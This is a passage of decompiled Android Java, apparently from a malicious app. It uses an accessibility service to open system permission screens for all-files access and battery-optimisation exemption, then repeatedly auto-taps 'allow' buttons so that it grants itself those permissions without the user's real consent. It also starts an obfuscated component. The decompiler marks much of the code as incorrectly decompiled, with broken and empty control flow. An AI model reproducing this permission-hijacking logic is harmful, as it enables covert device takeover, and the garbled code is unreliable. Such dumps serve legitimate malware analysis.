                    t60.m214704c5(str422, "╚════════════════════════════════════════════════════════════");
                } catch (Exception e4) {
                    e = e4;
                    tz0.m214808a8("Pipeline异常: ", e.getMessage(), c0364a1.f55049a2, e);
                    i = 0;
                    c0364a1.f55047a0.performGlobalAction(2);
                    return Boolean.valueOf(i != 0);
                }
                c0364a1.f55047a0.performGlobalAction(2);
                return Boolean.valueOf(i != 0);
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:88:0x0176, code lost:
    
        if (r10 != r1) goto L90;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:56:0x00c9 A[Catch: Exception -> 0x0033, TRY_ENTER, TryCatch #3 {Exception -> 0x0033, blocks: (B:13:0x002e, B:90:0x0179, B:87:0x016d, B:78:0x0134, B:82:0x0141, B:84:0x0157, B:75:0x0127, B:71:0x0119, B:56:0x00c9, B:58:0x00d1, B:60:0x00d7, B:63:0x00df, B:65:0x00e7, B:67:0x00ef, B:68:0x010b, B:72:0x011b), top: B:99:0x0021 }] */
    /* JADX WARN: Removed duplicated region for block: B:74:0x0126  */
    /* JADX WARN: Removed duplicated region for block: B:75:0x0127 A[Catch: Exception -> 0x0033, PHI: r0 r10
      0x0127: PHI (r0v13 com.storm.safe.rock.service.modules.yw5xud.a1) = (r0v30 com.storm.safe.rock.service.modules.yw5xud.a1), (r0v14 com.storm.safe.rock.service.modules.yw5xud.a1) binds: [B:73:0x0124, B:27:0x0051] A[DONT_GENERATE, DONT_INLINE]
      0x0127: PHI (r10v24 com.storm.safe.rock.service.modules.yw5xud.GenericSteps$executeAllFilesAccess$1) = 
      (r10v20 com.storm.safe.rock.service.modules.yw5xud.GenericSteps$executeAllFilesAccess$1)
      (r10v25 com.storm.safe.rock.service.modules.yw5xud.GenericSteps$executeAllFilesAccess$1)
     binds: [B:73:0x0124, B:27:0x0051] A[DONT_GENERATE, DONT_INLINE], TryCatch #3 {Exception -> 0x0033, blocks: (B:13:0x002e, B:90:0x0179, B:87:0x016d, B:78:0x0134, B:82:0x0141, B:84:0x0157, B:75:0x0127, B:71:0x0119, B:56:0x00c9, B:58:0x00d1, B:60:0x00d7, B:63:0x00df, B:65:0x00e7, B:67:0x00ef, B:68:0x010b, B:72:0x011b), top: B:99:0x0021 }] */
    /* JADX WARN: Removed duplicated region for block: B:77:0x0133  */
    /* JADX WARN: Removed duplicated region for block: B:78:0x0134 A[Catch: Exception -> 0x0033, PHI: r0 r10
      0x0134: PHI (r0v15 com.storm.safe.rock.service.modules.yw5xud.a1) = (r0v29 com.storm.safe.rock.service.modules.yw5xud.a1), (r0v16 com.storm.safe.rock.service.modules.yw5xud.a1) binds: [B:76:0x0131, B:24:0x0048] A[DONT_GENERATE, DONT_INLINE]
      0x0134: PHI (r10v26 com.storm.safe.rock.service.modules.yw5xud.GenericSteps$executeAllFilesAccess$1) = 
      (r10v24 com.storm.safe.rock.service.modules.yw5xud.GenericSteps$executeAllFilesAccess$1)
      (r10v27 com.storm.safe.rock.service.modules.yw5xud.GenericSteps$executeAllFilesAccess$1)
     binds: [B:76:0x0131, B:24:0x0048] A[DONT_GENERATE, DONT_INLINE], TryCatch #3 {Exception -> 0x0033, blocks: (B:13:0x002e, B:90:0x0179, B:87:0x016d, B:78:0x0134, B:82:0x0141, B:84:0x0157, B:75:0x0127, B:71:0x0119, B:56:0x00c9, B:58:0x00d1, B:60:0x00d7, B:63:0x00df, B:65:0x00e7, B:67:0x00ef, B:68:0x010b, B:72:0x011b), top: B:99:0x0021 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Removed duplicated region for block: B:80:0x013c  */
    /* JADX WARN: Removed duplicated region for block: B:81:0x013f  */
    /* JADX WARN: Removed duplicated region for block: B:84:0x0157 A[Catch: Exception -> 0x0033, TryCatch #3 {Exception -> 0x0033, blocks: (B:13:0x002e, B:90:0x0179, B:87:0x016d, B:78:0x0134, B:82:0x0141, B:84:0x0157, B:75:0x0127, B:71:0x0119, B:56:0x00c9, B:58:0x00d1, B:60:0x00d7, B:63:0x00df, B:65:0x00e7, B:67:0x00ef, B:68:0x010b, B:72:0x011b), top: B:99:0x0021 }] */
    /* JADX WARN: Type inference failed for: r0v19 */
    /* JADX WARN: Type inference failed for: r0v26 */
    /* JADX WARN: Type inference failed for: r0v27 */
    /* JADX WARN: Type inference failed for: r2v0, types: [int] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:69:0x0116 -> B:71:0x0119). Please report as a decompilation issue!!! */
    /* renamed from: a9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212129a9(ContinuationImpl continuationImpl) throws Throwable {
        GenericSteps$executeAllFilesAccess$1 genericSteps$executeAllFilesAccess$1;
        C0364a1 c0364a1;
        GenericSteps$executeAllFilesAccess$1 genericSteps$executeAllFilesAccess$12;
        C0364a1 c0364a12;
        int i;
        String string;
        C0364a1 c0364a13;
        C0364a1 c0364a14;
        Object objM212127a7;
        C0364a1 c0364a15;
        boolean zIsExternalStorageManager;
        C0364a1 c0364a16;
        if (continuationImpl instanceof GenericSteps$executeAllFilesAccess$1) {
            GenericSteps$executeAllFilesAccess$1 genericSteps$executeAllFilesAccess$13 = (GenericSteps$executeAllFilesAccess$1) continuationImpl;
            int i2 = genericSteps$executeAllFilesAccess$13.f53902a4;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                genericSteps$executeAllFilesAccess$13.f53902a4 = i2 - Integer.MIN_VALUE;
                genericSteps$executeAllFilesAccess$1 = genericSteps$executeAllFilesAccess$13;
            } else {
                genericSteps$executeAllFilesAccess$1 = new GenericSteps$executeAllFilesAccess$1(this, continuationImpl);
            }
        }
        Object obj = genericSteps$executeAllFilesAccess$1.f53900a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        ?? r2 = genericSteps$executeAllFilesAccess$1.f53902a4;
        GenericSteps$FlowType genericSteps$FlowType = GenericSteps$FlowType.f53880a4;
        try {
            try {
            } catch (Exception e) {
                e = e;
                genericSteps$executeAllFilesAccess$1 = r2;
            }
        } catch (Exception e2) {
            e = e2;
        }
        switch (r2) {
            case 0:
                kg1.m213544f4(obj);
                if (Build.VERSION.SDK_INT < 30) {
                    return Boolean.TRUE;
                }
                boolean zIsExternalStorageManager2 = Environment.isExternalStorageManager();
                String str = this.f55049a2;
                if (zIsExternalStorageManager2) {
                    t60.m214704c5(str, "[文件访问] 已授权，跳过");
                    return Boolean.TRUE;
                }
                w20 w20Var = this.f55050a3;
                if (w20Var.m214986a1(genericSteps$FlowType)) {
                    t60.m214704c5(str, "[文件访问] 达到最大尝试次数");
                    return Boolean.TRUE;
                }
                tz0.m214806a6("[文件访问] 开始执行 (尝试", w20Var.m214988a3(genericSteps$FlowType), "/2)", str);
                try {
                    Intent intent = new Intent("android.settings.MANAGE_ALL_FILES_ACCESS_PERMISSION");
                    intent.setFlags(276824064);
                    this.f55048a1.startActivity(intent);
                    genericSteps$executeAllFilesAccess$1.f53898a0 = this;
                    genericSteps$executeAllFilesAccess$1.f53902a4 = 1;
                } catch (Exception e3) {
                    e = e3;
                    genericSteps$executeAllFilesAccess$1 = this;
                    tz0.m214807a7("[文件访问] 异常: ", e.getMessage(), genericSteps$executeAllFilesAccess$1.f55049a2);
                    return Boolean.FALSE;
                }
                if (b81.m210571b1(1500L, genericSteps$executeAllFilesAccess$1) != coroutineSingletons) {
                    c0364a1 = this;
                    genericSteps$executeAllFilesAccess$12 = genericSteps$executeAllFilesAccess$1;
                    c0364a12 = c0364a1;
                    i = 1;
                    if (i < 7) {
                        AccessibilityNodeInfo rootInActiveWindow = c0364a12.f55047a0.getRootInActiveWindow();
                        if (rootInActiveWindow != null) {
                            CharSequence packageName = rootInActiveWindow.getPackageName();
                            if (packageName == null || (string = packageName.toString()) == null) {
                                string = "";
                            }
                            if (AbstractC0779a1.m213652a5(string, "settings", true) || AbstractC0779a1.m213652a5(string, "myfiles", true)) {
                                t60.m214704c5(c0364a12.f55049a2, "[文件访问] 列表页已打开 (" + string + ")");
                            }
                        }
                        genericSteps$executeAllFilesAccess$12.f53898a0 = c0364a12;
                        genericSteps$executeAllFilesAccess$12.f53899a1 = i;
                        genericSteps$executeAllFilesAccess$12.f53902a4 = 2;
                        c0364a13 = c0364a12;
                        if (b81.m210571b1(500L, genericSteps$executeAllFilesAccess$12) == coroutineSingletons) {
                        }
                        i++;
                        c0364a12 = c0364a13;
                        if (i < 7) {
                        }
                    }
                    genericSteps$executeAllFilesAccess$12.f53898a0 = c0364a12;
                    genericSteps$executeAllFilesAccess$12.f53902a4 = 3;
                    c0364a14 = c0364a12;
                    if (b81.m210571b1(500L, genericSteps$executeAllFilesAccess$12) != coroutineSingletons) {
                        genericSteps$executeAllFilesAccess$12.f53898a0 = c0364a14;
                        genericSteps$executeAllFilesAccess$12.f53902a4 = 4;
                        objM212127a7 = c0364a14.m212127a7(0, genericSteps$executeAllFilesAccess$12);
                        c0364a15 = c0364a14;
                        if (objM212127a7 == coroutineSingletons) {
                            zIsExternalStorageManager = Environment.isExternalStorageManager();
                            t60.m214704c5(c0364a15.f55049a2, "[文件访问] 最终状态: " + (!zIsExternalStorageManager ? "已授权" : "未授权"));
                            if (zIsExternalStorageManager) {
                                c0364a15.f55050a3.m214994a9(genericSteps$FlowType);
                                c0364a15.m212138c2();
                                genericSteps$executeAllFilesAccess$12.f53898a0 = c0364a15;
                                genericSteps$executeAllFilesAccess$12.f53902a4 = 5;
                                c0364a16 = c0364a15;
                                if (b81.m210571b1(300L, genericSteps$executeAllFilesAccess$12) != coroutineSingletons) {
                                    genericSteps$executeAllFilesAccess$12.f53898a0 = c0364a16;
                                    genericSteps$executeAllFilesAccess$12.f53902a4 = 6;
                                    Object objM212140c5 = c0364a16.m212140c5(genericSteps$executeAllFilesAccess$12);
                                    genericSteps$executeAllFilesAccess$1 = c0364a16;
                                    break;
                                }
                            }
                            return Boolean.FALSE;
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                c0364a1 = genericSteps$executeAllFilesAccess$1.f53898a0;
                kg1.m213544f4(obj);
                genericSteps$executeAllFilesAccess$12 = genericSteps$executeAllFilesAccess$1;
                c0364a12 = c0364a1;
                i = 1;
                if (i < 7) {
                }
                genericSteps$executeAllFilesAccess$12.f53898a0 = c0364a12;
                genericSteps$executeAllFilesAccess$12.f53902a4 = 3;
                c0364a14 = c0364a12;
                if (b81.m210571b1(500L, genericSteps$executeAllFilesAccess$12) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 2:
                i = genericSteps$executeAllFilesAccess$1.f53899a1;
                C0364a1 c0364a17 = genericSteps$executeAllFilesAccess$1.f53898a0;
                try {
                    kg1.m213544f4(obj);
                    genericSteps$executeAllFilesAccess$12 = genericSteps$executeAllFilesAccess$1;
                    c0364a13 = c0364a17;
                    i++;
                    c0364a12 = c0364a13;
                    if (i < 7) {
                    }
                    genericSteps$executeAllFilesAccess$12.f53898a0 = c0364a12;
                    genericSteps$executeAllFilesAccess$12.f53902a4 = 3;
                    c0364a14 = c0364a12;
                    if (b81.m210571b1(500L, genericSteps$executeAllFilesAccess$12) != coroutineSingletons) {
                    }
                    return coroutineSingletons;
                } catch (Exception e4) {
                    e = e4;
                    genericSteps$executeAllFilesAccess$1 = c0364a17;
                    tz0.m214807a7("[文件访问] 异常: ", e.getMessage(), genericSteps$executeAllFilesAccess$1.f55049a2);
                    return Boolean.FALSE;
                }
            case 3:
                C0364a1 c0364a18 = genericSteps$executeAllFilesAccess$1.f53898a0;
                kg1.m213544f4(obj);
                genericSteps$executeAllFilesAccess$12 = genericSteps$executeAllFilesAccess$1;
                c0364a14 = c0364a18;
                genericSteps$executeAllFilesAccess$12.f53898a0 = c0364a14;
                genericSteps$executeAllFilesAccess$12.f53902a4 = 4;
                objM212127a7 = c0364a14.m212127a7(0, genericSteps$executeAllFilesAccess$12);
                c0364a15 = c0364a14;
                if (objM212127a7 == coroutineSingletons) {
                }
                return coroutineSingletons;
            case 4:
                C0364a1 c0364a19 = genericSteps$executeAllFilesAccess$1.f53898a0;
                kg1.m213544f4(obj);
                genericSteps$executeAllFilesAccess$12 = genericSteps$executeAllFilesAccess$1;
                c0364a15 = c0364a19;
                zIsExternalStorageManager = Environment.isExternalStorageManager();
                if (!zIsExternalStorageManager) {
                }
                t60.m214704c5(c0364a15.f55049a2, "[文件访问] 最终状态: " + (!zIsExternalStorageManager ? "已授权" : "未授权"));
                if (zIsExternalStorageManager) {
                }
                return Boolean.FALSE;
            case 5:
                C0364a1 c0364a110 = genericSteps$executeAllFilesAccess$1.f53898a0;
                kg1.m213544f4(obj);
                genericSteps$executeAllFilesAccess$12 = genericSteps$executeAllFilesAccess$1;
                c0364a16 = c0364a110;
                genericSteps$executeAllFilesAccess$12.f53898a0 = c0364a16;
                genericSteps$executeAllFilesAccess$12.f53902a4 = 6;
                Object objM212140c52 = c0364a16.m212140c5(genericSteps$executeAllFilesAccess$12);
                genericSteps$executeAllFilesAccess$1 = c0364a16;
                break;
            case 6:
                C0364a1 c0364a111 = genericSteps$executeAllFilesAccess$1.f53898a0;
                kg1.m213544f4(obj);
                genericSteps$executeAllFilesAccess$1 = c0364a111;
                return Boolean.TRUE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:56:0x0132 A[Catch: Exception -> 0x0052, TRY_LEAVE, TryCatch #2 {Exception -> 0x0052, blocks: (B:16:0x0043, B:54:0x0128, B:56:0x0132, B:60:0x0140, B:62:0x0159, B:63:0x0160, B:68:0x017c, B:70:0x0182, B:75:0x01b9, B:80:0x01e1, B:23:0x0067, B:26:0x0081, B:29:0x008f, B:53:0x0105), top: B:90:0x002d }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Type inference failed for: r10v0 */
    /* JADX WARN: Type inference failed for: r10v11, types: [com.storm.safe.rock.service.modules.yw5xud.a1] */
    /* JADX WARN: Type inference failed for: r10v12, types: [com.storm.safe.rock.service.modules.yw5xud.a1] */
    /* JADX WARN: Type inference failed for: r10v14 */
    /* JADX WARN: Type inference failed for: r10v15 */
    /* JADX WARN: Type inference failed for: r10v7, types: [com.storm.safe.rock.service.modules.yw5xud.a1] */
    /* JADX WARN: Type inference failed for: r10v8 */
    /* JADX WARN: Type inference failed for: r10v9 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:78:0x01d6 -> B:79:0x01db). Please report as a decompilation issue!!! */
    /* renamed from: b0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212130b0(ContinuationImpl continuationImpl) throws Throwable {
        GenericSteps$executeBasicPermissions$1 genericSteps$executeBasicPermissions$1;
        C0364a1 c0364a1;
        C0364a1 c0364a12;
        long jCurrentTimeMillis;
        long j;
        int i;
        int i2;
        boolean z;
        C0364a1 c0364a13;
        long j2;
        int i3;
        GenericSteps$executeBasicPermissions$1 genericSteps$executeBasicPermissions$12;
        int i4;
        if (continuationImpl instanceof GenericSteps$executeBasicPermissions$1) {
            genericSteps$executeBasicPermissions$1 = (GenericSteps$executeBasicPermissions$1) continuationImpl;
            int i5 = genericSteps$executeBasicPermissions$1.f53910a7;
            if ((i5 & Integer.MIN_VALUE) != 0) {
                genericSteps$executeBasicPermissions$1.f53910a7 = i5 - Integer.MIN_VALUE;
            } else {
                genericSteps$executeBasicPermissions$1 = new GenericSteps$executeBasicPermissions$1(this, continuationImpl);
            }
        }
        Object obj = genericSteps$executeBasicPermissions$1.f53908a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i6 = genericSteps$executeBasicPermissions$1.f53910a7;
        GenericSteps$FlowType genericSteps$FlowType = GenericSteps$FlowType.f53876a0;
        C0364a1 c0364a14 = 2;
        int i7 = 3;
        boolean z2 = true;
        try {
            if (i6 == 0) {
                kg1.m213544f4(obj);
                w20 w20Var = this.f55050a3;
                boolean zM214992a7 = w20Var.m214992a7(genericSteps$FlowType);
                String str = this.f55049a2;
                if (zM214992a7) {
                    t60.m214704c5(str, "[基础权限] 已完成，跳过");
                    return Boolean.TRUE;
                }
                if (w20Var.m214986a1(genericSteps$FlowType)) {
                    t60.m214704c5(str, "[基础权限] 达到最大尝试次数");
                    w20Var.m214994a9(genericSteps$FlowType);
                    return Boolean.TRUE;
                }
                tz0.m214806a6("[基础权限] 开始执行 (尝试", w20Var.m214988a3(genericSteps$FlowType), "/2)", str);
                try {
                    t60.m214704c5(str, "[基础权限] 启动umrkmgrri...");
                    t60.m214704c5(str, "[基础权限] 调用 umrkmgrri.start()");
                    umrkmgrri.f55158a3.start(this.f55048a1);
                    genericSteps$executeBasicPermissions$1.f53903a0 = this;
                    genericSteps$executeBasicPermissions$1.f53910a7 = 1;
                    if (b81.m210571b1(800L, genericSteps$executeBasicPermissions$1) != coroutineSingletons) {
                        c0364a1 = this;
                    }
                    return coroutineSingletons;
                } catch (Exception e) {
                    e = e;
                    c0364a14 = this;
                    tz0.m214807a7("[基础权限] 异常: ", e.getMessage(), c0364a14.f55049a2);
                    return Boolean.FALSE;
                }
            }
            if (i6 != 1) {
                if (i6 == 2) {
                    C0364a1 c0364a15 = genericSteps$executeBasicPermissions$1.f53903a0;
                    kg1.m213544f4(obj);
                    c0364a12 = c0364a15;
                    jCurrentTimeMillis = System.currentTimeMillis();
                    t60.m214704c5(c0364a12.f55049a2, "[基础权限] 开始循环点击允许按钮 (超时=" + (20000 / 1000) + "秒)...");
                    j = 20000L;
                    i = 0;
                    i2 = 0;
                    c0364a14 = c0364a12;
                    if (System.currentTimeMillis() - jCurrentTimeMillis < j) {
                    }
                    long jCurrentTimeMillis2 = (System.currentTimeMillis() - jCurrentTimeMillis) / 1000;
                    t60.m214704c5(c0364a14.f55049a2, "[基础权限] 完成，用时" + jCurrentTimeMillis2 + "秒，点击" + i2 + "次");
                    c0364a14.f55050a3.m214994a9(genericSteps$FlowType);
                    return Boolean.TRUE;
                }
                if (i6 == 3) {
                    int i8 = genericSteps$executeBasicPermissions$1.f53907a4;
                    i2 = genericSteps$executeBasicPermissions$1.f53906a3;
                    long j3 = genericSteps$executeBasicPermissions$1.f53905a2;
                    long j4 = genericSteps$executeBasicPermissions$1.f53904a1;
                    c0364a14 = genericSteps$executeBasicPermissions$1.f53903a0;
                    kg1.m213544f4(obj);
                    j = j3;
                    jCurrentTimeMillis = j4;
                    z = true;
                    i = i8;
                } else if (i6 == 4) {
                    int i9 = genericSteps$executeBasicPermissions$1.f53907a4;
                    int i10 = genericSteps$executeBasicPermissions$1.f53906a3;
                    long j5 = genericSteps$executeBasicPermissions$1.f53905a2;
                    long j6 = genericSteps$executeBasicPermissions$1.f53904a1;
                    c0364a14 = genericSteps$executeBasicPermissions$1.f53903a0;
                    kg1.m213544f4(obj);
                    j = j5;
                    jCurrentTimeMillis = j6;
                    z = true;
                    i = i9;
                    genericSteps$executeBasicPermissions$1 = genericSteps$executeBasicPermissions$1;
                    i2 = i10;
                } else {
                    if (i6 != 5) {
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                    }
                    int i11 = genericSteps$executeBasicPermissions$1.f53907a4;
                    int i12 = genericSteps$executeBasicPermissions$1.f53906a3;
                    j = genericSteps$executeBasicPermissions$1.f53905a2;
                    long j7 = genericSteps$executeBasicPermissions$1.f53904a1;
                    C0364a1 c0364a16 = genericSteps$executeBasicPermissions$1.f53903a0;
                    kg1.m213544f4(obj);
                    c0364a13 = c0364a16;
                    z = true;
                    j2 = j7;
                    i3 = i12;
                    genericSteps$executeBasicPermissions$12 = genericSteps$executeBasicPermissions$1;
                    i4 = i11;
                    i = i4;
                    genericSteps$executeBasicPermissions$1 = genericSteps$executeBasicPermissions$12;
                    i2 = i3;
                    jCurrentTimeMillis = j2;
                    c0364a14 = c0364a13;
                }
                z2 = z;
                i7 = 3;
                c0364a14 = c0364a14;
                if (System.currentTimeMillis() - jCurrentTimeMillis < j) {
                    boolean zM212139c3 = c0364a14.m212139c3();
                    z = z2;
                    String str2 = c0364a14.f55049a2;
                    if (zM212139c3) {
                        if (c0364a14.m212122a0()) {
                            int i13 = i2 + 1;
                            t60.m214704c5(str2, "[基础权限] 点击允许 (第" + i13 + "次)");
                            genericSteps$executeBasicPermissions$1.f53903a0 = c0364a14;
                            genericSteps$executeBasicPermissions$1.f53904a1 = jCurrentTimeMillis;
                            genericSteps$executeBasicPermissions$1.f53905a2 = j;
                            genericSteps$executeBasicPermissions$1.f53906a3 = i13;
                            genericSteps$executeBasicPermissions$1.f53907a4 = 0;
                            genericSteps$executeBasicPermissions$1.f53910a7 = 4;
                            if (b81.m210571b1(400L, genericSteps$executeBasicPermissions$1) != coroutineSingletons) {
                                i = 0;
                                genericSteps$executeBasicPermissions$1 = genericSteps$executeBasicPermissions$1;
                                i2 = i13;
                                z2 = z;
                                i7 = 3;
                                c0364a14 = c0364a14;
                            }
                        } else {
                            t60.m214704c5(str2, "[基础权限] 未找到允许按钮，等待...");
                            genericSteps$executeBasicPermissions$1.f53903a0 = c0364a14;
                            genericSteps$executeBasicPermissions$1.f53904a1 = jCurrentTimeMillis;
                            genericSteps$executeBasicPermissions$1.f53905a2 = j;
                            genericSteps$executeBasicPermissions$1.f53906a3 = i2;
                            genericSteps$executeBasicPermissions$1.f53907a4 = 0;
                            genericSteps$executeBasicPermissions$1.f53910a7 = 5;
                            if (b81.m210571b1(300L, genericSteps$executeBasicPermissions$1) != coroutineSingletons) {
                                c0364a13 = c0364a14;
                                j2 = jCurrentTimeMillis;
                                i3 = i2;
                                genericSteps$executeBasicPermissions$12 = genericSteps$executeBasicPermissions$1;
                                i4 = 0;
                                i = i4;
                                genericSteps$executeBasicPermissions$1 = genericSteps$executeBasicPermissions$12;
                                i2 = i3;
                                jCurrentTimeMillis = j2;
                                c0364a14 = c0364a13;
                                z2 = z;
                                i7 = 3;
                                c0364a14 = c0364a14;
                            }
                        }
                        return coroutineSingletons;
                    }
                    int i14 = i + 1;
                    t60.m214704c5(str2, "[基础权限] 不在权限弹窗页面 (连续" + i14 + "次)");
                    if (i14 >= i7) {
                        t60.m214704c5(str2, "[基础权限] 权限弹窗已消失，流程完成");
                    } else {
                        genericSteps$executeBasicPermissions$1.f53903a0 = c0364a14;
                        genericSteps$executeBasicPermissions$1.f53904a1 = jCurrentTimeMillis;
                        genericSteps$executeBasicPermissions$1.f53905a2 = j;
                        genericSteps$executeBasicPermissions$1.f53906a3 = i2;
                        genericSteps$executeBasicPermissions$1.f53907a4 = i14;
                        genericSteps$executeBasicPermissions$1.f53910a7 = i7;
                        if (b81.m210571b1(500L, genericSteps$executeBasicPermissions$1) == coroutineSingletons) {
                            return coroutineSingletons;
                        }
                        i = i14;
                        z2 = z;
                        i7 = 3;
                        c0364a14 = c0364a14;
                    }
                    if (System.currentTimeMillis() - jCurrentTimeMillis < j) {
                    }
                }
                long jCurrentTimeMillis22 = (System.currentTimeMillis() - jCurrentTimeMillis) / 1000;
                t60.m214704c5(c0364a14.f55049a2, "[基础权限] 完成，用时" + jCurrentTimeMillis22 + "秒，点击" + i2 + "次");
                c0364a14.f55050a3.m214994a9(genericSteps$FlowType);
                return Boolean.TRUE;
            }
            c0364a1 = genericSteps$executeBasicPermissions$1.f53903a0;
            try {
                kg1.m213544f4(obj);
            } catch (Exception e2) {
                e = e2;
                c0364a14 = c0364a1;
                tz0.m214807a7("[基础权限] 异常: ", e.getMessage(), c0364a14.f55049a2);
                return Boolean.FALSE;
            }
            t60.m214704c5(c0364a1.f55049a2, "[基础权限] 等待页面稳定...");
            genericSteps$executeBasicPermissions$1.f53903a0 = c0364a1;
            genericSteps$executeBasicPermissions$1.f53910a7 = 2;
            if (c0364a1.m212141c7(1500L, genericSteps$executeBasicPermissions$1) != coroutineSingletons) {
                c0364a12 = c0364a1;
                jCurrentTimeMillis = System.currentTimeMillis();
                t60.m214704c5(c0364a12.f55049a2, "[基础权限] 开始循环点击允许按钮 (超时=" + (20000 / 1000) + "秒)...");
                j = 20000L;
                i = 0;
                i2 = 0;
                c0364a14 = c0364a12;
                if (System.currentTimeMillis() - jCurrentTimeMillis < j) {
                }
                long jCurrentTimeMillis222 = (System.currentTimeMillis() - jCurrentTimeMillis) / 1000;
                t60.m214704c5(c0364a14.f55049a2, "[基础权限] 完成，用时" + jCurrentTimeMillis222 + "秒，点击" + i2 + "次");
                c0364a14.f55050a3.m214994a9(genericSteps$FlowType);
                return Boolean.TRUE;
            }
            return coroutineSingletons;
        } catch (Exception e3) {
            e = e3;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:46:0x00ed A[Catch: Exception -> 0x004a, TryCatch #0 {Exception -> 0x004a, blocks: (B:21:0x0045, B:44:0x00e1, B:46:0x00ed, B:48:0x00fc, B:26:0x0052, B:41:0x00cf), top: B:61:0x0025 }] */
    /* JADX WARN: Removed duplicated region for block: B:48:0x00fc A[Catch: Exception -> 0x004a, TRY_LEAVE, TryCatch #0 {Exception -> 0x004a, blocks: (B:21:0x0045, B:44:0x00e1, B:46:0x00ed, B:48:0x00fc, B:26:0x0052, B:41:0x00cf), top: B:61:0x0025 }] */
    /* JADX WARN: Removed duplicated region for block: B:54:0x011b A[Catch: Exception -> 0x0036, TryCatch #1 {Exception -> 0x0036, blocks: (B:14:0x0031, B:52:0x010c, B:54:0x011b, B:55:0x0120), top: B:62:0x0031 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0015  */
    /* JADX WARN: Type inference failed for: r3v0, types: [int] */
    /* renamed from: b1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212131b1(ContinuationImpl continuationImpl) throws Throwable {
        GenericSteps$executeBatteryOptimization$1 genericSteps$executeBatteryOptimization$1;
        C0364a1 c0364a1;
        C0364a1 c0364a12;
        PowerManager powerManager;
        boolean zIsIgnoringBatteryOptimizations;
        if (continuationImpl instanceof GenericSteps$executeBatteryOptimization$1) {
            genericSteps$executeBatteryOptimization$1 = (GenericSteps$executeBatteryOptimization$1) continuationImpl;
            int i = genericSteps$executeBatteryOptimization$1.f53915a4;
            if ((i & Integer.MIN_VALUE) != 0) {
                genericSteps$executeBatteryOptimization$1.f53915a4 = i - Integer.MIN_VALUE;
            } else {
                genericSteps$executeBatteryOptimization$1 = new GenericSteps$executeBatteryOptimization$1(this, continuationImpl);
            }
        }
        Object obj = genericSteps$executeBatteryOptimization$1.f53913a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        ?? r3 = genericSteps$executeBatteryOptimization$1.f53915a4;
        GenericSteps$FlowType genericSteps$FlowType = GenericSteps$FlowType.f53877a1;
        try {
            if (r3 == 0) {
                kg1.m213544f4(obj);
                Context context = this.f55048a1;
                Object systemService = context.getSystemService("power");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.os.PowerManager");
                PowerManager powerManager2 = (PowerManager) systemService;
                boolean zIsIgnoringBatteryOptimizations2 = powerManager2.isIgnoringBatteryOptimizations(context.getPackageName());
                String str = this.f55049a2;
                if (zIsIgnoringBatteryOptimizations2) {
                    t60.m214704c5(str, "[电池优化] 已授权，跳过");
                    return Boolean.TRUE;
                }
                w20 w20Var = this.f55050a3;
                if (w20Var.m214986a1(genericSteps$FlowType)) {
                    t60.m214704c5(str, "[电池优化] 达到最大尝试次数");
                    return Boolean.TRUE;
                }
                tz0.m214806a6("[电池优化] 开始执行 (尝试", w20Var.m214988a3(genericSteps$FlowType), "/2)", str);
                try {
                    Intent intent = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                    intent.setData(Uri.parse("package:" + context.getPackageName()));
                    intent.setFlags(1350631424);
                    context.startActivity(intent);
                    genericSteps$executeBatteryOptimization$1.f53911a0 = this;
                    genericSteps$executeBatteryOptimization$1.f53912a1 = powerManager2;
                    genericSteps$executeBatteryOptimization$1.f53915a4 = 1;
                    if (b81.m210571b1(2000L, genericSteps$executeBatteryOptimization$1) != coroutineSingletons) {
                        c0364a12 = this;
                        powerManager = powerManager2;
                    }
                    return coroutineSingletons;
                } catch (Exception e) {
                    e = e;
                    c0364a1 = this;
                    tz0.m214807a7("[电池优化] 异常: ", e.getMessage(), c0364a1.f55049a2);
                    return Boolean.FALSE;
                }
            }
            if (r3 != 1) {
                if (r3 != 2) {
                    if (r3 != 3) {
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                    }
                    powerManager = genericSteps$executeBatteryOptimization$1.f53912a1;
                    c0364a1 = genericSteps$executeBatteryOptimization$1.f53911a0;
                    try {
                        kg1.m213544f4(obj);
                        c0364a1.m212125a5();
                        zIsIgnoringBatteryOptimizations = powerManager.isIgnoringBatteryOptimizations(c0364a1.f55048a1.getPackageName());
                        if (zIsIgnoringBatteryOptimizations) {
                            c0364a1.f55050a3.m214994a9(genericSteps$FlowType);
                        }
                        return Boolean.valueOf(zIsIgnoringBatteryOptimizations);
                    } catch (Exception e2) {
                        e = e2;
                        tz0.m214807a7("[电池优化] 异常: ", e.getMessage(), c0364a1.f55049a2);
                        return Boolean.FALSE;
                    }
                }
                powerManager = genericSteps$executeBatteryOptimization$1.f53912a1;
                c0364a12 = genericSteps$executeBatteryOptimization$1.f53911a0;
                kg1.m213544f4(obj);
                if (!powerManager.isIgnoringBatteryOptimizations(c0364a12.f55048a1.getPackageName())) {
                    t60.m214704c5(c0364a12.f55049a2, "[电池优化] ✅ 系统对话框点允许成功");
                    c0364a12.f55050a3.m214994a9(genericSteps$FlowType);
                    return Boolean.TRUE;
                }
